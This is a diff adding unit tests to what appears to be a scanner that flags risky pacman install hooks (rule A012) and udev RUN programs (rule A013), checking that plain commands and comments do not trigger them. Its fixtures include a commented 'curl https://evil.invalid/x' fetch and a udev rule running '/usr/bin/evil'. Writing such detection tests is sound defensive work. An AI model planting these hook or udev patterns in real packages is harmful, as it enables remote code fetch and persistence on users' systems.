@@ -207,6 +207,13 @@ def test_a012_fires_on_a_fetch_in_a_hook():
     assert "A012" in _ids(manifest)
 
 
+def test_a012_does_not_fire_on_a_plain_shell_command():
+    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
+                 "content": "[Trigger]\nOperation = Install\n"
+                            "Exec = /bin/sh -c 'update-info /usr/share/info'\n"}]
+    assert "A012" not in _ids(manifest)
+
+
 def test_a012_does_not_fire_on_a_plain_exec():
     manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
                  "content": "[Trigger]\nOperation = Install\nExec = /usr/bin/foo\n"}]
@@ -217,6 +224,18 @@ def test_a013_fires_on_a_udev_program():
     manifest = [{"path": "/etc/udev/rules.d/99-x.rules",
                  "content": 'ACTION=="add", RUN+="/usr/bin/evil"\n'}]
     assert "A013" in _ids(manifest)
+
+
+def test_a012_ignores_a_comment():
+    manifest = [{"path": "/etc/x.hook",
+                 "content": "# curl https://evil.invalid/x\nOperation = Install\n"}]
+    assert "A012" not in _ids(manifest)
+
+
+def test_a013_ignores_a_comment():
+    manifest = [{"path": "/etc/udev/rules.d/99-x.rules",
+                 "content": '# RUN+="/usr/bin/evil"\nACTION=="add", SYMLINK+="x"\n'}]
+    assert "A013" not in _ids(manifest)
 
 
 def test_a013_does_not_fire_on_a_symlink_only_rule():
